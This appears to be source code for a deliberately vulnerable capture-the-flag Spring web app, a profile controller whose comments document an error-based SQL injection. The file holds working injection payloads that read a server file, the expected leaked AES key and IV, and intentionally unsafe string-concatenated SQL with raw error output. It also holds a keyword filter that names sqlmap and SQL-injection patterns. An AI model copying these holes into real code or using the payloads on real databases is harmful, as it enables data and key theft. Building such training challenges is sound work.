package com.ctf.vaultpass.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpSession;
import java.util.List;
import java.util.Map;

/**
 * VULNERABILITY #2 — Error-Based SQL Injection
 *
 * POST /profile/secondary-email is vulnerable to error-based SQL injection.
 * The "secondaryEmail" parameter is directly concatenated into the UPDATE query.
 * When a type conversion error occurs, PostgreSQL includes the actual value in
 * the error message, which is returned to the user.
 *
 * This allows reading the AES key/IV from app_config — required for vuln #3.
 *
 * NOTE: sqlmap automated probes will crash the app (HTTP 500).
 * Only the manual CAST technique works.
 *
 * AES key/IV are no longer in the database — they are stored in /web.ini on the server.
 * Use pg_read_binary_file() + convert_from() to read the file via error-based SQLi.
 * Note: pg_read_file() is blocked by the WAF.
 *
 * Payload to read /web.ini (concat + CAST technique):
 *   secondaryEmail=' || CAST(convert_from(pg_read_binary_file('/web.ini'),'UTF8') AS INTEGER)--
 *
 * Expected error (full file contents leak in one shot):
 *   Ma'lumotlar bazasi xatosi: ERROR: invalid input syntax for type integer:
 *   "[vaultpass]\nkey=VjRhdWx0UGFzc0tleTEyMw==\niv=VjR1bHRJVjEyMzQ1Njc4IQ==\n"
 *
 * The values are base64-encoded. Decode them to get the actual key and IV:
 *   base64.b64decode("VjRhdWx0UGFzc0tleTEyMw==") == b'V4aultPassKey123'
 *   base64.b64decode("VjR1bHRJVjEyMzQ1Njc4IQ==") == b'V4ultIV12345678!'
 *
 * Why || instead of AND: UPDATE SET evaluates 'value' AND ... as a boolean assignment,
 * failing on 'value' before CAST fires. The || concat forces CAST to evaluate as an
 * expression, which then fails with the file contents in the error message.
 * pg_read_binary_file() is available because the DB user is a PostgreSQL superuser.
 */
@Controller
public class ProfileController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    // ----------------------------------------------------------------
    // GET /profile
    // ----------------------------------------------------------------
    @GetMapping("/profile")
    public String profilePage(HttpSession session, Model model) {
        Integer userId = (Integer) session.getAttribute("userId");

        try {
            List<Map<String, Object>> rows = jdbcTemplate.queryForList(
                "SELECT username, email, secondary_email, is_admin, created_at FROM users WHERE id = ?",
                userId
            );
            if (!rows.isEmpty()) {
                model.addAllAttributes(rows.get(0));
            }
        } catch (Exception e) {
            model.addAttribute("error", "Profil yuklab bo'lmadi: " + e.getMessage());
        }
        return "profile";
    }

    // ----------------------------------------------------------------
    // POST /profile/secondary-email  — VULNERABLE: error-based SQLi
    // ----------------------------------------------------------------
    @PostMapping("/profile/secondary-email")
    public String updateSecondaryEmail(@RequestParam String secondaryEmail,
                                       HttpSession session,
                                       Model model) {
        Integer userId = (Integer) session.getAttribute("userId");

        // ================================================================
        // ANTI-AUTOMATION WAF
        // sqlmap uses CHR() encoding for PostgreSQL payloads,
        // pg_sleep() for time-based, boolean string patterns, etc.
        // These patterns trigger a crash (500) to block automated scanning.
        // The manual CAST technique contains none of these patterns.
        // ================================================================
        if (isAutomatedSqlmapPayload(secondaryEmail)) {
            throw new RuntimeException(
                "java.lang.NullPointerException: Cannot invoke method getConnection() on null object"
            );
        }

        try {
            // !!!! VULNERABLE: direct string concatenation !!!!
            String sql = "UPDATE users SET secondary_email = '" + secondaryEmail
                       + "' WHERE id = " + userId;
            jdbcTemplate.update(sql);
            model.addAttribute("success", "Ikkilamchi elektron pochta muvaffaqiyatli yangilandi.");

        } catch (Exception e) {
            // !!!! VULNERABLE: full error message returned to user !!!!
            model.addAttribute("error", "Ma'lumotlar bazasi xatosi: " + e.getMessage());
        }

        // Reload profile data for the page
        try {
            List<Map<String, Object>> rows = jdbcTemplate.queryForList(
                "SELECT username, email, secondary_email, is_admin, created_at FROM users WHERE id = ?",
                userId
            );
            if (!rows.isEmpty()) {
                rows.get(0).forEach((k, v) -> {
                    if (!model.containsAttribute(k)) model.addAttribute(k, v);
                });
            }
        } catch (Exception ignored) {}

        return "profile";
    }

    /**
     * Detects sqlmap automated payloads for PostgreSQL.
     * sqlmap uses CHR() encoding (e.g. CHR(113)||CHR(98)...),
     * boolean string comparison (e.g. 'xyz'='xyz'), pg_sleep(), etc.
     * The manual CAST technique contains none of these:
     *   a@a.com' AND 1=CAST((SELECT config_value FROM app_config
     *            WHERE config_key='import_aes_key') AS INTEGER)--
     */
    private boolean isAutomatedSqlmapPayload(String input) {
        String lower = input.toLowerCase();
        if (lower.contains("chr("))          return true;
        if (lower.contains("pg_read_file(")) return true;
        if (lower.contains("pg_sleep("))     return true;
        if (lower.contains("sleep(") && lower.contains("'")) return true;
        if (lower.contains("waitfor"))       return true;
        if (lower.contains("union") && lower.contains("select")) return true;
        if (lower.contains("information_schema")) return true;
        if (lower.contains("extractvalue(")) return true;
        if (lower.contains("updatexml("))    return true;
        if (lower.contains("benchmark("))    return true;
        if (lower.matches(".*'[a-z0-9]{2,12}'\\s*=\\s*'[a-z0-9]{2,12}'.*")) return true;
        if (lower.contains("0x") && lower.contains("concat")) return true;
        if (lower.contains(";") && (lower.contains("select") || lower.contains("drop")
                || lower.contains("insert") || lower.contains("update")
                || lower.contains("copy")   || lower.contains("table"))) return true;
        return false;
    }
}
